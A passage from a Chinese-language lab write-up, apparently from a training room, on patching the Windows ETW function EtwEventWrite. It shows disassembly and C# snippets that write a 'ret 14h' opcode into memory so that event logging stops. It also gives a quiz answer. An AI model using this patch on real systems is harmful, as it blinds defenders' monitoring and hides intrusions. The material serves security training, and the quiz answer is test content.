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" width="511" height="271" class="img_ev3q"></p>
<p>将这个高级概念应用到我们的目标中，如果我们能够识别内存中如何调用返回语句，我们就可以将它写入函数并预期它在任何其他代码行之前执行。我们期望返回语句被放在最上面，因为栈使用的是 <strong>LIFO</strong>（<strong>L</strong>ast <strong>I</strong>n <strong>F</strong>irst <strong>O</strong>ut）结构。右侧是 LIFO 结构如何工作的简要示意图。随着我们深入探讨这个任务，我们会进一步扩展 LIFO 结构的操作原理。</p>
<p>现在我们对返回语句和 LIFO 结构有了更多的了解，接下来让我们回到它如何应用于事件跟踪。在编写任何代码或识别补丁函数的步骤之前，我们需要识别恶意函数以及可能的返回点。通过之前的研究，我们知道从 CLR 中，ETW 是通过 <code>EtwEventWrite</code> 函数写入的。为了识别“补丁点”或返回点，我们可以查看该函数的反汇编代码。</p>
<div class="language-wasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-wasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">779f2459 33cc		       xor	ecx, esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f245b e8501a0100	   call	ntdll!_security_check_cookie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f2460 8be5		       mov	esp, ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f2462 5d		         pop	ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f2463 c21400		     ret	14h </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>为了更好地理解我们在堆栈上试图实现的目标，我们可以将 <code>ret 14h</code> 操作码应用到之前的 LIFO 图示中。</p>
<p>当执行 <code>ret 14h</code> 时，它会从堆栈中弹出（pop）出一个返回地址，并将控制权转移到该地址。<code>14h</code> 参数指定了从堆栈中释放的字节数。由于堆栈使用的是 LIFO 结构，这意味着执行 <code>ret 14h</code> 后，堆栈中的最后 20 个字节（14h 对应 20 十进制）将被弹出，函数将跳到堆栈中的返回地址，结束函数执行。</p>
<p>在攻击中，通过将 <code>ret 14h</code> 的操作码（即 <code>c21400</code>）写入内存，攻击者可以修改目标函数的行为，强制该函数提前退出，阻止后续的 ETW 事件被处理或记录。这种修改相当于“切断”了事件跟踪的执行，减少了日志记录的可见性。</p>
<p><img decoding="async" loading="lazy" alt="Identical diagram to previous but with assembly included with ret 14h being pushed to the top and being popped out" src="/PgUp-code.github.io/assets/images/52fd846d5fa1e76948ac47d563ad6228-726bff12d61265d7062226d436ea78fa.png" width="511" height="231" class="img_ev3q"></p>
<p>现在我们对该技术的核心基础有了基本了解，接下来我们来看看它是如何在技术上应用的。</p>
<p>从高层次来看，ETW 补丁可以分为五个步骤：</p>
<ol>
<li>获取 <code>EtwEventWrite</code> 的句柄</li>
<li>修改该函数的内存权限</li>
<li>将操作码字节写入内存</li>
<li>重置该函数的内存权限（可选）</li>
<li>刷新指令缓存（可选）</li>
</ol>
<p>在第一步中，我们需要获取 <code>EtwEventWrite</code> 地址的句柄。该函数存储在 <code>ntdll</code> 中。我们首先使用 <code>LoadLibrary</code> 加载该库，然后使用 <code>GetProcAddress</code> 获取句柄。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">var ntdll = Win32.LoadLibrary(&quot;ntdll.dll&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">var etwFunction = Win32.GetProcAddress(ntdll, &quot;EtwEventWrite&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第二步中，我们需要修改函数的内存权限，以允许我们写入该函数。该函数的权限由 <code>flNewProtect</code> 参数定义；<code>0x40</code> 启用 X、R 或 RW 访问权限（<a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank" rel="noopener noreferrer">内存保护约束</a>）。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">uint oldProtect;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Win32.VirtualProtect(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	etwFunction, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	(UIntPtr)patch.Length, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	0x40, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	out oldProtect</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第三步，函数已经具有我们所需的权限来进行写操作，并且我们有了预定义的操作码来进行补丁。由于我们是写入函数而不是进程，因此可以使用臭名昭著的 <code>Marshal.Copy</code> 来写入我们的操作码。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">patch(new byte[] { 0xc2, 0x14, 0x00 });</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Marshal.Copy(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	patch, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	0, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	etwEventSend, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	patch.Length</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第四步，我们可以开始清理步骤，将内存权限恢复到原来的状态。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">VirtualProtect(etwFunction, 4, oldProtect, &amp;oldOldProtect);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第五步中，我们能够确保修补后的函数将从指令缓存（instruction cache）中执行。</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Win32.FlushInstructionCache(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	etwFunction,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以将这些步骤编译在一起，并将它们附加到恶意脚本或会话中。使用提供的 C# 脚本并尝试这种技术。</p>
<p>在操作码写入内存后，我们可以再次查看反汇编的函数，以观察补丁的效果。</p>
<div class="language-wasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-wasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">779f23c0 c21400		    ret	14h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f23c3 00ec		      add	ah, ch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f23c5 83e4f8		    and	esp, 0FFFFFFF8h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">779f23c8 81ece0000000	sub	esp, 0E0h</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在上面的反汇编中，我们可以看到与我们在 LIFO 图示中描述的完全一致（<em>图 2</em>）。</p>
<p>一旦函数在内存中被修补，每当调用 <code>EtwEventWrite</code> 时，它都会始终返回。</p>
<p>尽管这是一个精心设计的技术，但根据您的环境，它可能不是最佳的做法，因为它可能会限制更多的日志，从而影响完整性。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>ETW 安全检查在被修补之前的基础地址是多少？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">779f245b</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span 